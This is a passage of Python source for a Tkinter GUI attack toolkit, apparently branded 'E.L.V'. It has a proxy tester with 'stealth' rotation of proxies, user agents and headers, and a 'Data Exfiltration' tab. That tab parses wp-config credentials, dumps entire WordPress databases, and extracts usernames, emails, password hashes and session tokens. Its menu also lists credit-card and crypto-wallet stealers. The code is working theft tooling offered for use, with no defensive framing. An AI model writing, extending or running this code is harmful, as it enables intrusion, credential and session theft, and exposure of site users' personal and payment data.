        self.delay_min_entry = tk.Entry(delay_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.delay_min_entry.insert(0, '0.5')
        self.delay_min_entry.pack(side=tk.LEFT, padx=(0, 5))
        tk.Label(delay_frame, text='to', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.delay_max_entry = tk.Entry(delay_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.delay_max_entry.insert(0, '2.0')
        self.delay_max_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(stealth_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Button(button_frame, text='[APPLY TO ALL TOOLS]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_purple'], activebackground=CYAN_NEON, command=self.apply_stealth_settings, width=25, height=2).pack(fill=tk.X, pady=2)

    def setup_results_section(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        results_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(results_frame, text='Proxy Status & Results:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.stats_label = tk.Label(results_frame, text='Total: 0 | Tested: 0 | Valid: 0 | Invalid: 0 | Current IP: N/A', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10)
        self.stats_label.pack(fill=tk.X, pady=(0, 4))
        self.log_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=25, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.valid_proxies_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=10, wrap=tk.WORD)
        self.valid_proxies_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def load_proxy_file(self):
        filename = filedialog.askopenfilename(title='Select Proxy File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    proxies = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
                    self.proxy_text.delete(1.0, tk.END)
                    self.proxy_text.insert(1.0, '\n'.join(proxies))
                    self.log(f'Loaded {len(proxies)} proxies from file', 'fg_green')
            except Exception as e:
                messagebox.showerror('Error', f'Error loading file: {str(e)}')

    def add_proxy_manual(self):
        proxy = simpledialog.askstring('Add Proxy', 'Enter proxy (format: ip:port or ip:port:user:pass):')
        if proxy:
            self.proxy_text.insert(tk.END, f'{proxy}\n')
            self.log(f'Added proxy: {proxy[:30]}...', 'fg_cyan')

    def clear_proxies(self):
        self.proxy_text.delete(1.0, tk.END)
        self.proxy_pool = []
        self.valid_proxies = []
        self.log('Proxy list cleared', 'fg_yellow')

    def load_proxies_from_file(self):
        try:
            if os.path.exists('valid_proxies.txt'):
                with open('valid_proxies.txt', 'r', encoding='utf-8') as f:
                    proxies = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
                    if proxies:
                        self.proxy_text.insert(1.0, '\n'.join(proxies))
                        self.log(f'Loaded {len(proxies)} proxies from valid_proxies.txt', 'fg_green')
        except:
            pass

    def test_all_proxies(self):
        proxy_text = self.proxy_text.get(1.0, tk.END).strip()
        if not proxy_text:
            messagebox.showwarning('Warning', 'No proxies to test!')
            return
        proxies = [line.strip() for line in proxy_text.split('\n') if line.strip() and (not line.strip().startswith('#'))]
        if not proxies:
            messagebox.showwarning('Warning', 'No valid proxies found!')
            return
        test_url = self.test_url_entry.get().strip() or 'https://httpbin.org/ip'
        self.is_running = True
        self.stop_flag = False
        self.proxy_pool = proxies
        self.valid_proxies = []
        self.stats = {'total': len(proxies), 'tested': 0, 'valid': 0, 'invalid': 0, 'current_ip': None}
        self.log(f'Testing {len(proxies)} proxies...', 'fg_cyan')
        thread = threading.Thread(target=self.test_proxies_worker, args=(proxies, test_url), daemon=True)
        thread.start()

    def test_proxies_worker(self, proxies, test_url):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        max_workers = min(20, len(proxies))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy, proxy, test_url): proxy for proxy in proxies}
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    result = future.result()
                    with self.stats_lock:
                        self.stats['tested'] += 1
                        if result and result.get('valid'):
                            self.valid_proxies.append(result['proxy'])
                            self.stats['valid'] += 1
                            self.log(f"[VALID] {result['proxy']} | IP: {result.get('ip', 'N/A')}", 'fg_green')
                            self.frame.after(0, lambda p=result['proxy']: self.valid_proxies_text.insert(tk.END, f'{p}\n', 'green'))
                            self.frame.after(0, lambda: self.valid_proxies_text.see(tk.END))
                        else:
                            self.stats['invalid'] += 1
                        self.stats_queue.put(self.stats.copy())
                except:
                    pass
        self.is_running = False
        self.log(f'Testing completed. Valid: {len(self.valid_proxies)}/{len(proxies)}', 'fg_green')

    def test_proxy(self, proxy, test_url):
        try:
            proxy_dict = self.format_proxy(proxy)
            if not proxy_dict:
                return None
            session = requests.Session()
            session.proxies = proxy_dict
            session.headers.update(DEFAULT_HEADERS.copy())
            resp = session.get(test_url, timeout=10, verify=False)
            if resp.status_code == 200:
                try:
                    ip_data = resp.json()
                    ip = ip_data.get('origin', 'N/A')
                except:
                    ip = 'N/A'
                return {'proxy': proxy, 'valid': True, 'ip': ip}
        except:
            pass
        return None

    def format_proxy(self, proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) >= 2:
                ip = parts[0]
                port = parts[1]
                if len(parts) >= 4:
                    user = parts[2]
                    password = parts[3]
                    proxy_url = f'http://{user}:{password}@{ip}:{port}'
                else:
                    proxy_url = f'http://{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
        except:
            pass
        return None

    def save_valid_proxies(self):
        if not self.valid_proxies:
            messagebox.showwarning('Warning', 'No valid proxies to save!')
            return
        try:
            with open('valid_proxies.txt', 'w', encoding='utf-8') as f:
                f.write(f"# Valid Proxies - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                for proxy in self.valid_proxies:
                    f.write(f'{proxy}\n')
            self.log(f'Saved {len(self.valid_proxies)} valid proxies to valid_proxies.txt', 'fg_green')
            messagebox.showinfo('Success', f'Saved {len(self.valid_proxies)} valid proxies!')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def get_next_proxy(self):
        if not self.valid_proxies:
            return None
        if self.rotate_proxy_var.get():
            proxy = self.valid_proxies[self.current_proxy_index % len(self.valid_proxies)]
            self.current_proxy_index += 1
            return self.format_proxy(proxy)
        return None

    def get_random_user_agent(self):
        if self.rotate_ua_var.get():
            return random.choice(self.user_agents)
        return DEFAULT_USER_AGENT

    def get_random_headers(self):
        headers = DEFAULT_HEADERS.copy()
        if self.rotate_ua_var.get():
            headers['User-Agent'] = self.get_random_user_agent()
        if self.randomize_headers_var.get():
            headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'])
            headers['Accept'] = random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'])
        return headers

    def get_random_delay(self):
        if self.random_delay_var.get():
            try:
                min_delay = float(self.delay_min_entry.get() or '0.5')
                max_delay = float(self.delay_max_entry.get() or '2.0')
                return random.uniform(min_delay, max_delay)
            except:
                return random.uniform(0.5, 2.0)
        return 0

    def apply_stealth_settings(self):
        self.log('[STEALTH] Settings applied to all tools. Proxies and headers will be rotated automatically.', 'fg_green')
        messagebox.showinfo('Success', 'Stealth settings applied!\n\nAll tools will now use:\n- Proxy rotation\n- User-Agent rotation\n- Header randomization\n- Random delays')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 500:
                    self.log_text.delete(1.0, f'{lines - 200}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                stats_text = f"Total: {stats['total']} | Tested: {stats['tested']} | Valid: {stats['valid']} | Invalid: {stats['invalid']} | Current IP: {stats.get('current_ip', 'N/A')}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class DataExfiltrationTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.exfiltrated_data = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'databases': 0, 'users': 0, 'emails': 0, 'cookies': 0, 'crypto': 0, 'cards': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='E.L.V DATA EXFILTRATION PROTOCOL', font=('Courier', 20, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_input_section(left_frame)
        self.setup_options_section(left_frame)
        self.setup_results_section(right_frame)

    def setup_input_section(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target Input:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(url_frame, text='URL/File:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        cred_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        cred_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(cred_frame, text='DB Host:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.db_host_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=15)
        self.db_host_entry.pack(side=tk.LEFT, padx=(0, 5))
        tk.Label(cred_frame, text='DB User:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.db_user_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=12)
        self.db_user_entry.pack(side=tk.LEFT, padx=(0, 5))
        tk.Label(cred_frame, text='DB Pass:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.db_pass_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=12, show='*')
        self.db_pass_entry.pack(side=tk.LEFT, padx=(0, 5))
        tk.Label(cred_frame, text='DB Name:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.db_name_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=12)
        self.db_name_entry.pack(side=tk.LEFT)
        tk.Button(input_frame, text='Load from wp-config/credentials file', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.load_db_credentials).pack(pady=(0, 8))

    def setup_options_section(self, parent):
        options_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Exfiltration Options:', font=('Courier', 10, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(options_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.db_export_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Database Export (Auto-dump SQL)', variable=self.db_export_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.user_data_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='User Data Export (Emails, Passwords, Hashes)', variable=self.user_data_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.email_harvest_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Email Harvester (Extract emails from DB/Website)', variable=self.email_harvest_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.cookie_steal_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Cookie/Session Stealer (Extract active sessions)', variable=self.cookie_steal_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.card_extract_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Credit Card Extractor (Scan DB for payment data)', variable=self.card_extract_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.crypto_steal_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Crypto Wallet Stealer (Scan for wallet files/keys)', variable=self.crypto_steal_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        config_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        config_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(config_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.threads_entry.insert(0, '5')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(config_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START EXFILTRATION]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_purple'], activebackground=CYAN_NEON, command=self.start_exfiltration, width=25, height=2)
        self.start_button.pack(fill=tk.X, pady=2)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, command=self.stop_exfiltration, width=25, height=2, state=tk.DISABLED)
        self.stop_button.pack(fill=tk.X, pady=2)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, command=self.save_results, width=25)
        self.save_button.pack(fill=tk.X, pady=2)

    def setup_results_section(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        results_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(results_frame, text='Exfiltration Results:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.stats_label = tk.Label(results_frame, text='Total: 0 | Processed: 0 | DB: 0 | Users: 0 | Emails: 0 | Cookies: 0 | Crypto: 0 | Cards: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10)
        self.stats_label.pack(fill=tk.X, pady=(0, 4))
        self.log_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=25, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.results_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=15, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def load_db_credentials(self):
        filename = filedialog.askopenfilename(title='Select wp-config.php or credentials file', filetypes=[('PHP files', '*.php'), ('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    db_name_match = re.search('define\\([\'\\"]DB_NAME[\'\\"],\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content)
                    db_user_match = re.search('define\\([\'\\"]DB_USER[\'\\"],\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content)
                    db_pass_match = re.search('define\\([\'\\"]DB_PASSWORD[\'\\"],\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content)
                    db_host_match = re.search('define\\([\'\\"]DB_HOST[\'\\"],\\s*[\'\\"]([^\'\\"]+)[\'\\"]', content)
                    if db_name_match:
                        self.db_name_entry.delete(0, tk.END)
                        self.db_name_entry.insert(0, db_name_match.group(1))
                    if db_user_match:
                        self.db_user_entry.delete(0, tk.END)
                        self.db_user_entry.insert(0, db_user_match.group(1))
                    if db_pass_match:
                        self.db_pass_entry.delete(0, tk.END)
                        self.db_pass_entry.insert(0, db_pass_match.group(1))
                    if db_host_match:
                        self.db_host_entry.delete(0, tk.END)
                        self.db_host_entry.insert(0, db_host_match.group(1))
                    self.log(f'Loaded DB credentials from {filename}', 'fg_green')
            except Exception as e:
                messagebox.showerror('Error', f'Error loading credentials: {str(e)}')

    def start_exfiltration(self):
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showerror('Error', 'Please enter target URL or select a file!')
            return
        try:
            threads = int(self.threads_entry.get() or '5')
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 5
        try:
            timeout = int(self.timeout_entry.get() or '15')
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        self.is_running = True
        self.stop_flag = False
        self.exfiltrated_data = []
        self.stats = {'total': 0, 'processed': 0, 'databases': 0, 'users': 0, 'emails': 0, 'cookies': 0, 'crypto': 0, 'cards': 0}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting data exfiltration...', 'fg_cyan')
        thread = threading.Thread(target=self.exfiltration_worker, args=(url_input, threads, timeout), daemon=True)
        thread.start()

    def stop_exfiltration(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Exfiltration stopped', 'fg_yellow')

    def exfiltration_worker(self, url_input, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')):
                            if line.startswith('http://') or line.startswith('https://'):
                                urls.append(line.rstrip('/'))
            except Exception as e:
                self.log(f'Error reading file: {str(e)[:50]}', 'fg_red')
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
                return
        else:
            url = url_input.rstrip('/')
            if url.startswith('http://') or url.startswith('https://'):
                urls.append(url)
        if not urls:
            self.log('No valid URLs found!', 'fg_red')
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            return
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        db_host = self.db_host_entry.get().strip()
        db_user = self.db_user_entry.get().strip()
        db_pass = self.db_pass_entry.get().strip()
        db_name = self.db_name_entry.get().strip()
        max_workers = min(threads, len(urls))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.exfiltrate_target, url, timeout, db_host, db_user, db_pass, db_name): url for url in urls}
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    result = future.result()
                    if result:
                        self.exfiltrated_data.append(result)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result.get('database_dumped'):
                                self.stats['databases'] += 1
                            if result.get('users_extracted'):
                                self.stats['users'] += len(result.get('users', []))
                            if result.get('emails_extracted'):
                                self.stats['emails'] += len(result.get('emails', []))
                            if result.get('cookies_stolen'):
                                self.stats['cookies'] += len(result.get('cookies', []))
                            if result.get('crypto_found'):
                                self.stats['crypto'] += len(result.get('crypto', []))
                            if result.get('cards_found'):
                                self.stats['cards'] += len(result.get('cards', []))
                        self.stats_queue.put(self.stats.copy())
                        result_summary = f"[EXFILTRATED] {result['url']} | DB: {result.get('database_dumped', False)} | Users: {len(result.get('users', []))} | Emails: {len(result.get('emails', []))}\n"
                        self.frame.after(0, lambda rs=result_summary: self.results_text.insert(tk.END, rs, 'green'))
                        self.frame.after(0, lambda: self.results_text.see(tk.END))
                except:
                    pass
        self.is_running = False
        self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
        self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
        self.log(f"Exfiltration completed. Total: {self.stats['processed']} | DB: {self.stats['databases']} | Users: {self.stats['users']} | Emails: {self.stats['emails']}", 'fg_green')

    def exfiltrate_target(self, url, timeout, db_host, db_user, db_pass, db_name):
        if self.stop_flag:
            return None
        result = {'url': url, 'database_dumped': False, 'users': [], 'emails': [], 'cookies': [], 'crypto': [], 'cards': []}
        try:
            if self.db_export_var.get() and db_host and db_user and db_pass and db_name:
                self.log(f'[DB-EXPORT] Dumping database for {url}...', 'fg_cyan')
                db_dump = self.export_database(db_host, db_user, db_pass, db_name)
                if db_dump:
                    result['database_dumped'] = True
                    result['database_path'] = db_dump
                    self.log(f'[DB-SUCCESS] Database dumped: {db_dump}', 'fg_green')
            if self.user_data_var.get():
                self.log(f'[USER-EXPORT] Extracting user data from {url}...', 'fg_cyan')
                users = self.extract_user_data(url, timeout, db_host, db_user, db_pass, db_name)
                if users:
                    result['users'] = users
                    result['users_extracted'] = True
                    self.log(f'[USER-SUCCESS] Extracted {len(users)} users', 'fg_green')
            if self.email_harvest_var.get():
                self.log(f'[EMAIL-HARVEST] Harvesting emails from {url}...', 'fg_cyan')
                emails = self.harvest_emails(url, timeout, db_host, db_user, db_pass, db_name)
                if emails:
                    result['emails'] = emails
                    result['emails_extracted'] = True
                    self.log(f'[EMAIL-SUCCESS] Harvested {len(emails)} emails', 'fg_green')
            if self.cookie_steal_var.get():
                self.log(f'[COOKIE-STEAL] Stealing cookies from {url}...', 'fg_cyan')
                cookies = self.steal_cookies(url, timeout, db_host, db_user, db_pass, db_name)
                if cookies:
                    result['cookies'] = cookies
                    result['cookies_stolen'] = True
                    self.log(f'[COOKIE-SUCCESS] Stole {len(cookies)} cookie sessions', 'fg_green')
            if self.card_extract_var.get():
                self.log(f'[CARD-EXTRACT] Extracting credit cards from {url}...', 'fg_cyan')
                cards = self.extract_credit_cards(url, timeout, db_host, db_user, db_pass, db_name)
                if cards:
                    result['cards'] = cards
                    result['cards_found'] = True
                    self.log(f'[CARD-SUCCESS] Found {len(cards)} credit cards', 'fg_green')
            if self.crypto_steal_var.get():
                self.log(f'[ELV-CRYPTO] Scanning for crypto wallets on {url}...', 'fg_cyan')
                crypto = self.steal_crypto_wallets(url, timeout)
                if crypto:
                    result['crypto'] = crypto
                    result['crypto_found'] = True
                    self.log(f'[CRYPTO-SUCCESS] Found {len(crypto)} crypto wallets', 'fg_green')
            return result
        except Exception as e:
            return None

    def export_database(self, db_host, db_user, db_pass, db_name):
        try:
            import pymysql
            connection = pymysql.connect(host=db_host, user=db_user, password=db_pass, database=db_name, connect_timeout=10)
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            dump_file = f'db_dump_{db_name}_{timestamp}.sql'
            cursor = connection.cursor()
            cursor.execute('SHOW TABLES')
            tables = [table[0] for table in cursor.fetchall()]
            with open(dump_file, 'w', encoding='utf-8') as f:
                f.write(f'-- Database Dump: {db_name}\n')
                f.write(f'-- Host: {db_host}\n')
                f.write(f"-- Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for table in tables:
                    cursor.execute(f'SELECT * FROM `{table}`')
                    rows = cursor.fetchall()
                    if rows:
                        cursor.execute(f'SHOW CREATE TABLE `{table}`')
                        create_table = cursor.fetchone()[1]
                        f.write(f'\n-- Table: {table}\n')
                        f.write(f'DROP TABLE IF EXISTS `{table}`;\n')
                        f.write(f'{create_table};\n\n')
                        for row in rows:
                            values = ','.join([f"'{str(v).replace(chr(39), chr(39) + chr(39))}'" if v is not None else 'NULL' for v in row])
                            f.write(f'INSERT INTO `{table}` VALUES ({values});\n')
            cursor.close()
            connection.close()
            return dump_file
        except Exception as e:
            self.log(f'[DB-ERROR] {str(e)[:100]}', 'fg_red')
            return None

    def extract_user_data(self, url, timeout, db_host, db_user, db_pass, db_name):
        users = []
        try:
            if db_host and db_user and db_pass and db_name:
                import pymysql
                connection = pymysql.connect(host=db_host, user=db_user, password=db_pass, database=db_name, connect_timeout=10)
                cursor = connection.cursor()
                cursor.execute('SELECT user_login, user_email, user_pass FROM wp_users LIMIT 1000')
                rows = cursor.fetchall()
                for row in rows:
                    users.append({'username': row[0], 'email': row[1], 'password_hash': row[2]})
                cursor.close()
                connection.close()
            else:
                session = requests.Session()
                session.headers.update(DEFAULT_HEADERS.copy())
                rest_url = urljoin(url, '/wp-json/wp/v2/users')
                resp = session.get(rest_url, timeout=timeout, verify=False)
                if resp.status_code == 200:
                    data = resp.json()
                    for user in data:
                        users.append({'id': user.get('id'), 'username': user.get('slug'), 'email': user.get('email', 'N/A'), 'name': user.get('name', 'N/A')})
        except:
            pass
        return users

    def harvest_emails(self, url, timeout, db_host, db_user, db_pass, db_name):
        emails = set()
        try:
            if db_host and db_user and db_pass and db_name:
                import pymysql
                connection = pymysql.connect(host=db_host, user=db_user, password=db_pass, database=db_name, connect_timeout=10)
                cursor = connection.cursor()
                cursor.execute('SELECT user_email FROM wp_users WHERE user_email IS NOT NULL')
                rows = cursor.fetchall()
                for row in rows:
                    if row[0] and '@' in row[0]:
                        emails.add(row[0])
                cursor.execute("SELECT meta_value FROM wp_usermeta WHERE meta_key IN ('billing_email', 'email')")
                rows = cursor.fetchall()
                for row in rows:
                    if row[0] and '@' in str(row[0]):
                        emails.add(str(row[0]))
                cursor.close()
                connection.close()
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            resp = session.get(url, timeout=timeout, verify=False)
            email_pattern = '\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b'
            found_emails = re.findall(email_pattern, resp.text)
            emails.update(found_emails)
        except:
            pass
        return list(emails)

    def steal_cookies(self, url, timeout, db_host, db_user, db_pass, db_name):
        cookies = []
        try:
            if db_host and db_user and db_pass and db_name:
                import pymysql
                connection = pymysql.connect(host=db_host, user=db_user, password=db_pass, database=db_name, connect_timeout=10)
                cursor = connection.cursor()
                cursor.execute('SELECT user_id, session_token, login_time FROM wp_sessions WHERE session_token IS NOT NULL LIMIT 100')
                rows = cursor.fetchall()
                for row in rows:
                    cookies.append({'user_id': row[0], 'session_token': row[1], 'login_time': str(row[2]) if row[2] else 'N/A'})
                cursor.close()
                connection.close()
        except:
            pass
        return cookies

